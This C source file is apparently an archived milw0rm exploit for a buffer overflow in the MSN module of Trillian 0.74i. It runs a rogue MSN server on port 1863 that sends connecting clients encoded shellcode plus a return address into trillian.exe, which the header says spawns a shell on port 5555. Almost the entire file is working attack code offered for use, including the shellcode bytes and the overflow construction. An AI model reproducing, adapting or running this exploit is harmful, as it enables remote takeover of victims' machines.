/*
	Cerulean Studios Trillian 0.74i Buffer Overflow in MSN module exploit
	created by Komrade  -  unsecure altervista org

	Written for Windows 2000 / Windows XP.
	Tested on Windows XP Professional sp0.

	This exploit spawn a shell on port 5555, you have just to execute the
	program	and connect to port 5555.
*/

#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#include <string.h>

int main(int argc,char **argv){

	char shellcode[] =
	"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x66\x01\x80\x34\x0A\x99\xE2\xFA\xEB"
	"\x05\xE8\xEB\xFF\xFF\xFF\x70\x99\x98\x99\x99\xC3\xFD\x12\xD8\xA9\x12"
	"\xD9\x95\x12\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12"
	"\xEF\xE1\x9A\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8"
	"\x12\xA6\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E"
	"\x9D\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"
	"\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12"
	"\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71\xE5"
	"\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3\x9D\xC0"
	"\x71\xF0\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66\xCE\x69\x12"
	"\x41\x5E\x9E\x9B\x99\x8C\x2A\xAA\x59\x10\xDE\x9D\xF3\x89\xCE\xCA\x66"
	"\xCE\x6D\xF3\x98\xCA\x66\xCE\x61\xC9\xC9\xCA\x66\xCE\x65\x1A\x75\xDD"
	"\x12\x6D\xAA\x42\xF3\x89\xC0\x10\x85\x17\x7B\x62\x10\xDF\xA1\x10\xDF"
	"\xA5\x10\xDF\xD9\x5E\xDF\xB5\x98\x98\x99\x99\x14\xDE\x89\xC9\xCF\xCA"
	"\xCA\xCA\xF3\x98\xCA\xCA\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9"
	"\xCA\x66\xCE\x7D\xC9\x66\xCE\x71\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB"
	"\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59\x5A\x71\x62\x67\x66\x66"
	"\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB"
	"\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED"
	"\xC9\xEB\xF6\xFA\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8"
	"\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA"
	"\xF2\xFC\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99"
	"\xF8\xFA\xFA\xFC\xE9\xED\x99";


	SOCKET sock, client;
	struct sockaddr_in sock_addr, client_addr;
	WSADATA data;
	WORD p;
	char mess[4096];
	int lun, n, i;

	p = MAKEWORD(2, 0);
	WSAStartup(p, &data);

	printf("------------------------------------------------------------------------\r\n");
	printf("-  Cerulean Studios Trillian 0.74i MSN module Buffer Overflow exploit  -\r\n");
	printf("-                   for Windows 2000 / Windows XP                      -\r\n");
	printf("-                                                                      -\r\n");
	printf("-         created by Komrade  -  http://unsecure.altervista.org        -\r\n");
	printf("------------------------------------------------------------------------\r\n");

	sock = socket(PF_INET,SOCK_STREAM, 0);
	sock_addr.sin_family = PF_INET;
	sock_addr.sin_port = htons(1863);
	sock_addr.sin_addr.s_addr = INADDR_ANY;

	bind(sock, (struct sockaddr*)&sock_addr, sizeof(struct sockaddr_in));
	listen(sock,1);

	lun = sizeof (struct sockaddr);

	printf("\r\nWaiting for a connection...\r\n");

	client = accept(sock, (struct sockaddr*)&client_addr, &lun);
	if (client <= 0){
		printf("Unable to wait for connections\r\n");
		exit(-1);
	}

	n=recv(client, mess, sizeof(mess),0);
	if (n < 0){
		printf("Error receving connections\r\n");
		exit(-1);
	}

	printf("Received a connection request from a client.\r\n");

	strcpy(mess, shellcode);

	for(i=strlen(shellcode); i < 4090; i++)
		mess[i]='x';

	mess[i]=0x33;	/**/
	mess[i+1]=0x12;	/*return address of a "call ebx" command in trillian.exe*/
	mess[i+2]=0x40;	/**/
	mess[i+3]='\r';
	mess[i+4]='\n';
	mess[i+5]='\0';

	n = send(client, mess, strlen(mess),0);
	if (n > 0){
		printf("Exploit sent succesfully.\r\n");
		printf("Now connect to port 5555.\r\n");
	}
	else
		printf("Error sending the exploit\r\n");

	closesocket (client);
	closesocket(sock);
	WSACleanup();
	return 0;
}

// milw0rm.com [2004-09-08]
